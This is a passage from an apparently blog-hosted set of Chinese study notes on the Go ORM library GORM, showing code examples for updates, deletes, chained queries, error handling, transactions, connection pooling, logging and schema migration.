class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 如果单个属性被更改了，更新它</span><br><span class="line">db.Model(&amp;user).Update("name", "hello")</span><br><span class="line">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111;</span><br><span class="line"></span><br><span class="line">// 使用组合条件更新单个属性</span><br><span class="line">db.Model(&amp;user).Where("active = ?", true).Update("name", "hello")</span><br><span class="line">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111 AND active=true;</span><br><span class="line"></span><br><span class="line">// 使用 `map` 更新多个属性，只会更新那些被更改了的字段</span><br><span class="line">db.Model(&amp;user).Updates(map[string]interface{}{"name": "hello", "age": 18, "actived": false})</span><br><span class="line">// UPDATE users SET name='hello', age=18, actived=false, updated_at='2013-11-17 21:34:10' WHERE id=111;</span><br><span class="line"></span><br><span class="line">// 使用 `struct` 更新多个属性，只会更新那些被修改了的和非空的字段</span><br><span class="line">db.Model(&amp;user).Updates(User{Name: "hello", Age: 18})</span><br><span class="line">// UPDATE users SET name='hello', age=18, updated_at = '2013-11-17 21:34:10' WHERE id = 111;</span><br><span class="line"></span><br><span class="line">// 警告： 当使用结构体更新的时候, GORM 只会更新那些非空的字段</span><br><span class="line">// 例如下面的更新，没有东西会被更新，因为像 "", 0, false 是这些字段类型的空值</span><br><span class="line">db.Model(&amp;user).Updates(User{Name: "", Age: 0, Actived: false})</span><br></pre></td></tr></tbody></table></figure><p><strong>更新选中的字段</strong></p><blockquote><p>如果你在执行更新操作时只想更新或者忽略某些字段，可以使用 Select，Omit 方法。</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">db.Model(&amp;user).Select("name").Updates(map[string]interface{}{"name": "hello", "age": 18, "actived": false})</span><br><span class="line">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111;</span><br><span class="line">//多个</span><br><span class="line">db.Model(User{}).Where("id=?",19).Select([]string{"username","phone"}).Updates(map[string]interface{}{"username":"qiyou","phone":123,"blog":"abc.com"})</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db.Model(&amp;user).Omit("name").Updates(map[string]interface{}{"name": "hello", "age": 18, "actived": false})</span><br><span class="line">//// UPDATE users SET age=18, actived=false, updated_at='2013-11-17 21:34:10' WHERE id=111;</span><br></pre></td></tr></tbody></table></figure><p><strong>更新列钩子方法</strong><br>上面的更新操作更新时会执行模型的 BeforeUpdate 和 AfterUpdate 方法，来更新 UpdatedAt 时间戳，并且保存他的 关联。如果你不想执行这些操作，可以使用 UpdateColumn，UpdateColumns 方法。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Update single attribute, similar with `Update`</span></span><br><span class="line">db.Model(&amp;user).UpdateColumn(<span class="string">"name"</span>, <span class="string">"hello"</span>)</span><br><span class="line"><span class="comment">//// UPDATE users SET name='hello' WHERE id = 111;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Update multiple attributes, similar with `Updates`</span></span><br><span class="line">db.Model(&amp;user).UpdateColumns(User{Name: <span class="string">"hello"</span>, Age: <span class="number">18</span>})</span><br><span class="line"><span class="comment">//// UPDATE users SET name='hello', age=18 WHERE id = 111;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>批量更新</p><blockquote><p>批量更新时，钩子函数不会执行</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.Table("users").Where("id IN (?)", []int{10, 11}).Updates(map[string]interface{}{"name": "hello", "age": 18})</span><br><span class="line">//// UPDATE users SET name='hello', age=18 WHERE id IN (10, 11);</span><br><span class="line"></span><br><span class="line">// 使用结构体更新将只适用于非零值，或者使用 map[string]interface{}</span><br><span class="line">db.Model(User{}).Updates(User{Name: "hello", Age: 18})</span><br><span class="line">//// UPDATE users SET name='hello', age=18;</span><br><span class="line"></span><br><span class="line">// 使用 `RowsAffected` 获取更新影响的记录数</span><br><span class="line">db.Model(User{}).Updates(User{Name: "hello", Age: 18}).RowsAffected</span><br></pre></td></tr></tbody></table></figure><p>带有表达式的 SQL 更新<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DB.Model(&amp;product).Update(<span class="string">"price"</span>, gorm.Expr(<span class="string">"price * ? + ?"</span>, <span class="number">2</span>, <span class="number">100</span>))</span><br><span class="line"><span class="comment">//// UPDATE "products" SET "price" = price * '2' + '100', "updated_at" = '2013-11-17 21:34:10' WHERE "id" = '2';</span></span><br><span class="line"></span><br><span class="line">DB.Model(&amp;product).Updates(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"price"</span>: gorm.Expr(<span class="string">"price * ? + ?"</span>, <span class="number">2</span>, <span class="number">100</span>)})</span><br><span class="line"><span class="comment">//// UPDATE "products" SET "price" = price * '2' + '100', "updated_at" = '2013-11-17 21:34:10' WHERE "id" = '2';</span></span><br><span class="line"></span><br><span class="line">DB.Model(&amp;product).UpdateColumn(<span class="string">"quantity"</span>, gorm.Expr(<span class="string">"quantity - ?"</span>, <span class="number">1</span>))</span><br><span class="line"><span class="comment">//// UPDATE "products" SET "quantity" = quantity - 1 WHERE "id" = '2';</span></span><br><span class="line"></span><br><span class="line">DB.Model(&amp;product).Where(<span class="string">"quantity &gt; 1"</span>).UpdateColumn(<span class="string">"quantity"</span>, gorm.Expr(<span class="string">"quantity - ?"</span>, <span class="number">1</span>))</span><br><span class="line"><span class="comment">//// UPDATE "products" SET "quantity" = quantity - 1 WHERE "id" = '2' AND quantity &gt; 1;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>在钩子函数中更新值<br>如果你想使用 BeforeUpdate、BeforeSave 钩子函数修改更新的值，可以使用 scope.SetColumn 方法，例如：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user *User)</span> <span class="title">BeforeSave</span><span class="params">(scope *gorm.Scope)</span> <span class="params">(err error)</span></span> {</span><br><span class="line">  <span class="keyword">if</span> pw, err := bcrypt.GenerateFromPassword(user.Password, <span class="number">0</span>); err == <span class="literal">nil</span> {</span><br><span class="line">    scope.SetColumn(<span class="string">"EncryptedPassword"</span>, pw)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>额外的更新选项</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在更新 SQL 语句中添加额外的 SQL 选项</span></span><br><span class="line">db.Model(&amp;user).Set(<span class="string">"gorm:update_option"</span>, <span class="string">"OPTION (OPTIMIZE FOR UNKNOWN)"</span>).Update(<span class="string">"name"</span>, <span class="string">"hello"</span>)</span><br><span class="line"><span class="comment">//// UPDATE users SET name='hello', updated_at = '2013-11-17 21:34:10' WHERE id=111 OPTION (OPTIMIZE FOR UNKNOWN);</span></span><br></pre></td></tr></tbody></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p><strong>条件删除</strong></p><blockquote><p>删除匹配的记录</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db.Where(<span class="string">"email LIKE ?"</span>, <span class="string">"%jinzhu%"</span>).Delete(Email{})</span><br><span class="line"><span class="comment">// DELETE from emails where email LIKE "%jinzhu%";</span></span><br><span class="line"></span><br><span class="line">db.Delete(Email{}, <span class="string">"email LIKE ?"</span>, <span class="string">"%jinzhu%"</span>)</span><br><span class="line"><span class="comment">// DELETE from emails where email LIKE "%jinzhu%";</span></span><br></pre></td></tr></tbody></table></figure><p><strong>软删除</strong><br>如果模型中有 DeletedAt 字段，它将自动拥有软删除的能力！当执行删除操作时，数据并不会永久的从数据库中删除，而是将 DeletedAt 的值更新为当前时间。</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">db.Delete(&amp;user)</span><br><span class="line"><span class="comment">// UPDATE users SET deleted_at="2013-10-29 10:23" WHERE id = 111;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量删除</span></span><br><span class="line">db.Where(<span class="string">"age = ?"</span>, <span class="number">20</span>).Delete(&amp;User{})</span><br><span class="line"><span class="comment">// UPDATE users SET deleted_at="2013-10-29 10:23" WHERE age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在查询记录时，软删除记录会被忽略</span></span><br><span class="line">db.Where(<span class="string">"age = 20"</span>).Find(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20 AND deleted_at IS NULL;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Unscoped 方法查找软删除记录</span></span><br><span class="line">db.Unscoped().Where(<span class="string">"age = 20"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Unscoped 方法永久删除记录</span></span><br><span class="line">db.Unscoped().Delete(&amp;order)</span><br><span class="line"><span class="comment">// DELETE FROM orders WHERE id=10;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="链式操作"><a href="#链式操作" class="headerlink" title="链式操作"></a>链式操作</h2><blockquote><p>所有的链式操作都将会克隆并创建一个新的数据库对象（共享一个连接池），<code>GORM</code> 对于多个 <code>goroutines</code> 的并发使用是安全的。</p></blockquote><h3 id="简单的链式操作"><a href="#简单的链式操作" class="headerlink" title="简单的链式操作"></a>简单的链式操作</h3><p>Gorm 继承了链式操作接口<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u []User</span><br><span class="line">st:=db.Where(<span class="string">"id&gt;?"</span>,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>{</span><br><span class="line">st=st.Where(<span class="string">"phone=?"</span>,<span class="number">123</span>)</span><br><span class="line">}</span><br><span class="line">st.Find(&amp;u)</span><br></pre></td></tr></tbody></table></figure><p></p><p>也可以这么写<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Where().Where().Find()</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="封装成方法"><a href="#封装成方法" class="headerlink" title="封装成方法"></a>封装成方法</h3><p><code>Scope</code>方法基于链式操作理论创建的。</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Test</span><span class="params">(db *gorm.DB)</span>*<span class="title">gorm</span>.<span class="title">DB</span></span>{</span><br><span class="line"><span class="keyword">return</span> db.Where(<span class="string">"id&gt;?"</span>,<span class="number">18</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> u []User</span><br><span class="line">db.Scopes(Test).Find(&amp;u)</span><br><span class="line">fmt.Println(u)</span><br></pre></td></tr></tbody></table></figure><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="处理单个错误"><a href="#处理单个错误" class="headerlink" title="处理单个错误"></a>处理单个错误</h3><p>如果发生任何错误，<code>GORM</code> 会将其设置为 <code>* gorm.DB</code> 的 <code>Error</code> 字段<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u []User</span><br><span class="line"><span class="comment">//这里故意写错一个表达式</span></span><br><span class="line"><span class="keyword">if</span> err:=db.Where(<span class="string">"id : ?"</span>,<span class="number">22</span>).Find(&amp;u).Error;err!=<span class="literal">nil</span>{</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">fmt.Println(u)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>或者这么写<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u []User</span><br><span class="line"><span class="comment">//这里故意写错一个表达式</span></span><br><span class="line">rs:=db.Where(<span class="string">"id : ?"</span>,<span class="number">22</span>).Find(&amp;u)</span><br><span class="line"><span class="keyword">if</span> rs.Error!=<span class="literal">nil</span>{</span><br><span class="line">fmt.Println(rs.Error.Error())</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">fmt.Println(u)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="处理多个错误"><a href="#处理多个错误" class="headerlink" title="处理多个错误"></a>处理多个错误</h3><p>在处理数据期间，发生几个错误很普遍，GORM 提供了一个 API 来将所有发生的错误作为切片返回<br>如果有多个错误产生，<code>GetErrors</code> 返回一个 <code>[]error</code>的切片</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u []User</span><br><span class="line"><span class="comment">//这里故意写错一个表达式</span></span><br><span class="line">errs:=db.Where(<span class="string">"id :: ?"</span>,<span class="number">1</span>).Find(&amp;u).GetErrors()</span><br><span class="line">fmt.Println(<span class="built_in">len</span>(errs))</span><br><span class="line"><span class="keyword">for</span> _,err:=<span class="keyword">range</span> errs{</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p><code>GORM</code>默认在事务中执行单个 <code>create</code>， <code>update</code>， <code>delete</code> 操作，以确保数据库数据完整性。<br>如果你想将多个 <code>create</code>， <code>update</code>， <code>delete</code> 当成一个原子性操作，<code>Transaction</code>就是为了这个而创造的。</p><p>要在事务中执行一组操作，正常的流程如下所示。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开启事务</span></span><br><span class="line">tx := db.Begin()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在事务中执行一些数据库操作 （从这里开始使用 'tx'，而不是 'db'）</span></span><br><span class="line">tx.Create(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发生错误回滚事务</span></span><br><span class="line">tx.Rollback()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者提交这个事务</span></span><br><span class="line">tx.Commit()</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">wangwu:=User{</span><br><span class="line">Username: <span class="string">"wangwu"</span>,</span><br><span class="line">Password: <span class="string">"wangwu"</span>,</span><br><span class="line">Email:    <span class="string">"wangwu@gmail.com"</span>,</span><br><span class="line">Blog:     <span class="string">"wangwu.com"</span>,</span><br><span class="line">Phone:    <span class="number">10086</span>,</span><br><span class="line">}</span><br><span class="line">tx:=db.Begin()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line"><span class="keyword">if</span> r:=<span class="built_in">recover</span>();r!=<span class="literal">nil</span>{</span><br><span class="line">tx.Rollback()</span><br><span class="line">}</span><br><span class="line">}()</span><br><span class="line"><span class="keyword">if</span> tx.Error!=<span class="literal">nil</span>{</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">err = tx.Create(&amp;wangwu).Error</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line">tx.Rollback()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">err = tx.Commit().Error</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="原生SQL语句"><a href="#原生SQL语句" class="headerlink" title="原生SQL语句"></a>原生SQL语句</h2><h2 id="通用数据库接口"><a href="#通用数据库接口" class="headerlink" title="通用数据库接口"></a>通用数据库接口</h2><p>GORM 提供了从当前的<code>*gorm.DB</code>连接中返回通用的数据库接口的方法<code>DB *sql.DB</code>。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取通用数据库对象 sql.DB 来使用他的 db.DB() 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ping</span></span><br><span class="line">db.DB().Ping()</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SetMaxIdleConns 设置空闲连接池中的最大连接数。</span></span><br><span class="line">db.DB().SetMaxIdleConns(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetMaxOpenConns 设置数据库连接最大打开数。</span></span><br><span class="line">db.DB().SetMaxOpenConns(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetConnMaxLifetime 设置可重用连接的最长时间</span></span><br><span class="line">db.DB().SetConnMaxLifetime(time.Hour)</span><br></pre></td></tr></tbody></table></figure><h2 id="自定义logger"><a href="#自定义logger" class="headerlink" title="自定义logger"></a>自定义logger</h2><p>Gorm 建立了对 <code>Logger</code> 的支持，默认模式只会在错误发生的时候打印日志。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开启 Logger, 以展示详细的日志</span></span><br><span class="line">db.LogMode(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 Logger, 不再展示任何日志，即使是错误日志</span></span><br><span class="line">db.LogMode(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对某个操作展示详细的日志，用来排查该操作的问题</span></span><br><span class="line">db.Debug().Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).First(&amp;User{})</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="数据库迁移"><a href="#数据库迁移" class="headerlink" title="数据库迁移"></a>数据库迁移</h2><blockquote><p>使用 migrate 来维持你的表结构一直处于最新状态。</p></blockquote><p>警告：migrate 仅支持创建表，没有的字段和没有索引。为了保护你的数据，它并不支持改变已有的字段类型或删除未被使用的字段<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.AutoMigrate(&amp;User{})</span><br><span class="line"></span><br><span class="line">db.AutoMigrate(&amp;User{}, &amp;Product{}, &amp;Order{})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建表的时候，添加表后缀</span></span><br><span class="line">db.Set(<span class="string">"gorm:table_options"</span>, <span class="string">"ENGINE=InnoDB"</span>).AutoMigrate(&amp;User{})</span><br></pre></td></tr></tbody></table></figure><p></p><p>其他数据库迁移工具<br>GORM 的数据库迁移工具能够支持主要的数据库，但是如果你要寻找更多的迁移工具， GORM 会提供的数据库接口，这可能可以给到你帮助。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 返回 `*sql.DB`</span><br><span class="line">db.DB()</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="表结构的方法"><a href="#表结构的方法" class="headerlink" title="表结构的方法"></a>表结构的方法</h3><p><strong>Has Table</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查模型中 User 表是否存在</span></span><br><span class="line">db.HasTable(&amp;User{})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 users 表是否存在</span></span><br><span class="line">db.HasTable(<span class="string">"users"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Create Table</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过模型 User 创建表</span></span><br><span class="line">db.CreateTable(&amp;User{})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在创建 users 表的时候，会在 SQL 语句中拼接上 `"ENGINE=InnoDB"`</span></span><br><span class="line">db.Set(<span class="string">"gorm:table_options"</span>, <span class="string">"ENGINE=InnoDB"</span>).CreateTable(&amp;User{})</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Drop table</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 删除模型 User 表</span><br><span class="line">db.DropTable(&amp;User{})</span><br><span class="line"></span><br><span class="line">// 删除 users 表</span><br><span class="line">db.DropTable("users")</span><br><span class="line"></span><br><span class="line">// 删除模型 User 表和 products 表</span><br><span class="line">db.DropTableIfExists(&amp;User{}, "products")</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>ModifyColumn</strong><br>以给定的值来定义字段类型<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// User 模型，改变 description 字段的数据类型为 `text`</span><br><span class="line">db.Model(&amp;User{}).ModifyColumn("description", "text")</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>DropColumn</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User 模型，删除  description 字段</span></span><br><span class="line">db.Model(&amp;User{}).DropColumn(<span class="string">"description"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Add Indexes</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为 `name` 字段建立一个名叫 `idx_user_name` 的索引</span></span><br><span class="line">db.Model(&amp;User{}).AddIndex(<span class="string">"idx_user_name"</span>, <span class="string">"name"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 `name`, `age` 字段建立一个名叫 `idx_user_name_age` 的索引</span></span><br><span class="line">db.Model(&amp;User{}).AddIndex(<span class="string">"idx_user_name_age"</span>, <span class="string">"name"</span>, <span class="string">"age"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一条唯一索引</span></span><br><span class="line">db.Model(&amp;User{}).AddUniqueIndex(<span class="string">"idx_user_name"</span>, <span class="string">"name"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为多个字段添加唯一索引</span></span><br><span class="line">db.Model(&amp;User{}).AddUniqueIndex(<span class="string">"idx_user_name_age"</span>, <span class="string">"name"</span>, <span class="string">"age"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Remove Index</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移除索引</span></span><br><span class="line">db.Model(&amp;User{}).RemoveIndex(<span class="string">"idx_user_name"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Add Foreign Key</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加主键</span></span><br><span class="line"><span class="comment">// 第一个参数 : 主键的字段</span></span><br><span class="line"><span class="comment">// 第二个参数 : 目标表的 ID</span></span><br><span class="line"><span class="comment">// 第三个参数 : ONDELETE</span></span><br><span class="line"><span class="comment">// 第四个参数 : ONUPDATE</span></span><br><span class="line">db.Model(&amp;User{}).AddForeignKey(<span class="string">"city_id"</span>, <span class="string">"cities(id)"</span>, <span class="string">"RESTRICT"</span>, <span class="string">"RESTRICT"</span>)</span><br><span class="line">Remove ForeignKey</span><br><span class="line">db.Model(&amp;User{}).RemoveForeignKey(<span class="string">"city_id"</span>, <span class="string">"cities(id)"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> GORM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin学习笔记</title>
      <link href="/2020/01/14/Gin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/14/Gin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
